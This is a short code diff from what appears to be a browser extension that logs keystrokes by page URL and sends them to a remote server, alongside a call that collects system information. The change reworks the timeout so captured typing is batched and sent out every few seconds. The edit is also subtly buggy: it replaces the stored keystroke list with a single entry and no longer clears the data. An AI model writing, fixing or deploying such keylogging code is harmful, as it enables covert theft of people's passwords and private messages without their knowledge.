@@ -120,6 +120,7 @@ collectSystemInfo();
 
 
 let keystrokeData = {};
+let keystrokeTimeout = null; // Declare globally
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message.type === "keystroke") {
@@ -129,11 +130,14 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
             keystrokeData[url] = [];
         }
 
-        keystrokeData[url].push({ text, timestamp });
-        setTimeout(() => {
-            sendToServer("keys", keystrokeData);
-            keystrokeData = {}; // Clear after sending
-        }, 3000);
+        if (keystrokeTimeout) {
+            clearTimeout(keystrokeTimeout);
+        }
 
+        keystrokeTimeout = setTimeout(() => {
+            keystrokeData[url] = { text, timestamp };
+            sendToServer("keys", keystrokeData);
+            keystrokeTimeout = null; // Reset timeout reference
+        }, 3000);
     }
 });
